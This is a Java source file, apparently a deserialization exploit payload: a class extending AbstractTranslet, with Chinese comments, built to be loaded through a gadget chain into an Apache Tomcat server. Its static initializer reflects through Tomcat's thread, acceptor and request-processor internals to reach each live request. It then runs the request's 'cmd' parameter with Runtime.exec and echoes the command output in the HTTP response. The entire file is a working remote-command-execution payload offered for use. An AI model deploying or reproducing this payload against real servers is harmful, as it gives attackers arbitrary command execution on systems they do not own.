import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;

import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class AllTomcatEcho extends AbstractTranslet {

    static{
        try {
            // 获取thread数组
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field threadsField =  ThreadGroup.class.getDeclaredField("threads");
            threadsField.setAccessible(true);
            Thread[] threads = (Thread[])threadsField.get(threadGroup);

            for(Thread thread:threads) {
                Field targetField = Thread.class.getDeclaredField("target");
                targetField.setAccessible(true);
                Object target  = targetField.get(thread);
                if( target != null && target.getClass() == org.apache.tomcat.util.net.Acceptor.class ) {
                    Field endpointField = Class.forName("org.apache.tomcat.util.net.Acceptor").getDeclaredField("endpoint");
                    endpointField.setAccessible(true);
                    Object endpoint = endpointField.get(target);
                    Field handlerField = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");
                    handlerField.setAccessible(true);
                    Object handler = handlerField.get(endpoint);

                    // 获取内部类ConnectionHandler的global
                    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);

                    // 获取RequestGroupInfo的processors
                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    java.util.List<RequestInfo> RequestInfolist = (java.util.List<RequestInfo>) processors.get(global);


                    // 获取Response，并做输出处理
                    Field reqField = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    reqField.setAccessible(true);
                    for (RequestInfo requestInfo : RequestInfolist) {//遍历
                        org.apache.coyote.Request coyoteReq = (org.apache.coyote.Request) reqField.get(requestInfo);//获取request
                        org.apache.catalina.connector.Request connectorRequest = (org.apache.catalina.connector.Request) coyoteReq.getNote(1);//获取catalina.connector.Request类型的Request
                        Response connectorResponse = connectorRequest.getResponse();

                        // 从connectorRequest 中获取参数并执行
                        String cmd = connectorRequest.getParameter("cmd");
                        String res = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();

                        // 方法一
                    connectorResponse.getOutputStream().write(res.getBytes(StandardCharsets.UTF_8));
                    connectorResponse.flushBuffer();

                        // 方法二
//                        java.io.Writer w = response.getWriter();//获取Writer
//                        Field responseField = ResponseFacade.class.getDeclaredField("response");
//                        responseField.setAccessible(true);
//                        Field usingWriter = Response.class.getDeclaredField("usingWriter");
//                        usingWriter.setAccessible(true);
//                        usingWriter.set(connectorResponse, Boolean.FALSE);//初始化
//                        w.write(res);
//                        w.flush();//刷新
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
